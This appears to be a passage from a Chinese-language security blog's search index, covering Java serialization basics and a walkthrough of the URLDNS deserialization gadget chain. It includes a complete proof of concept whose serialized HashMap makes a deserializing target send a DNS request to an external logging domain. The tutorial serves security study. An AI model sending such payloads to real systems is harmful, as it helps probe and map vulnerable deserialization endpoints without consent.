ois.readObject(); return obj; } } ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":"世界上最简单的 java 链 先来看一下如何序列化/反序列化 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user.setName(\"xiaoming\"); //序列化输出 ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(user); System.out.println(); // 序列化写入文件 FileOutputStream file = new FileOutputStream(\"test.bin\"); ObjectOutputStream fout = new ObjectOutputStream(file); fout.writeObject(user); // 序列化写入到变量中 ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream jout = new ObjectOutputStream(bout); jout.writeObject(user); byte[] str = bout.toByteArray(); System.out.println(new String(str)); // 从变量中反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); user user_d = (user) ois.readObject(); System.out.println(user_d.getName()); } } class user implements Serializable{ private String name; public user() { } public void setName(String name) { this.name = name; } public String getName() { return name; } } URLDNS链详解","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 原理java.util.HashMap重写了readObject方法，在反序列化时调用hash函数计算 key 的 hashCode，而java.net.URL的 hashCode 在计算时会调用getHostAddress来解析域名，从而发出 DNS 请求 由HashMap 类readObject引起， private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { reinitialize(); ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\"loadFactor\", 0.75f); if (lf \u003c= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\"Illegal load factor: \" + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u003c 0) { throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u003e 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u003c DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u003e= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u003c MAXIMUM_CAPACITY \u0026\u0026 ft \u003c MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\"rawtypes\",\"unchecked\"}) Node\u003cK,V\u003e[] tab = (Node\u003cK,V\u003e[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 在HashMap的键名计算了 hash， putVal(hash(key), key, value, false, false); 跟进查看一下 调用了key.hashCode()，而这里的 key 是可控的，就是传入的java.net.URL，跟进查看一下 这里hashCode==-1，重新进行hashCode()方法计算，跟进handler查看调用了哪一个hashCode() transient关键字，修饰 Java 序列化对象时，不需要序列化属性也就是handler属性不参与序列化，直接跟进URLStreamHandler查看一下 这里调用了getHostAddress跟进查看一下 又调用了java.net.URL的getHostAddress方法 继续跟进 进入到InetAddress.getByName(host);便会触发DNS请求 继续回到readObject()中，看看如何给key赋值 key是从K key = (K) s.readObject();这串代码，也就是readObject中得到的，说明之前是writeObject会写入 key HashMap#writeObject 进入了internalWriteEntries()跟进查看 这里的key以及value是从 tab 中取的，而 tab 的值即HashMap中 table 的值。 想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以这里也会产生一次dns查询 为了避免这次 dns 查询，我们将hashCode设置不为-1的其他值 构造完整poc package org.example; import java.io.*; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { HashMap hashmap = new HashMap(); URL url = new URL(\"http://47894df839.ipv6.1433.eu.org\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,1); hashmap.put(url,1); f.set(url,-1); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashmap); byte[] str = b.toByteArray(); System.out.println(str); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); ois.readObject(); } } 调用栈如下 ","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"}]